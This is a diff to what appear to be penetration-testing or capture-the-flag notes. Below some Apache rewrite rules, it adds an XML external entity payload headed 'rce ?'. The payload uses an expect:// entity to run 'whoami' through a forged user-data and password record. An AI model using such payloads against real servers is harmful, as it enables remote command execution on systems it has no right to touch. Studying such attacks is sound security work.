@@ -221,3 +221,37 @@ RewriteRule ^api/data/$ /index.php/api/data [L,QSA]
 RewriteRule ^api$ /index.php/api [L,QSA]
 RewriteRule ^api/$ /index.php/api [L,QSA]%
 #+end_src
+
+
+** rce ?
+
+#+begin_src sh
+<?xml version="1.0" ?>
+<!DOCTYPE UserData [
+<!ENTITY cmd SYSTEM "expect://whoami">
+]>
+<UserData>
+  <UserInformation>
+    <UserName>&cmd;</UserName>
+    <Country>USA</Country>
+    <ZipCode>00000</ZipCode>
+    <Location>NYC</Location>
+    <CurrentLanguage>en-US</CurrentLanguage>
+    <IPAddress>127.0.0.1</IPAddress>
+    <ScreenSize>1920x1080</ScreenSize>
+    <OperationSystem>Linux</OperationSystem>
+    <LogDate>2025-10-23</LogDate>
+    <AvailableKeyboardLayouts>US</AvailableKeyboardLayouts>
+    <Hardwares>CPU</Hardwares>
+    <Antiviruses>None</Antiviruses>
+  </UserInformation>
+  <Passwords>
+    <Password>
+      <URL>http://example.com</URL>
+      <Username>testuser</Username>
+      <Password>testpass</Password>
+      <Application>Browser</Application>
+    </Password>
+  </Passwords>
+</UserData>
+#+end_src
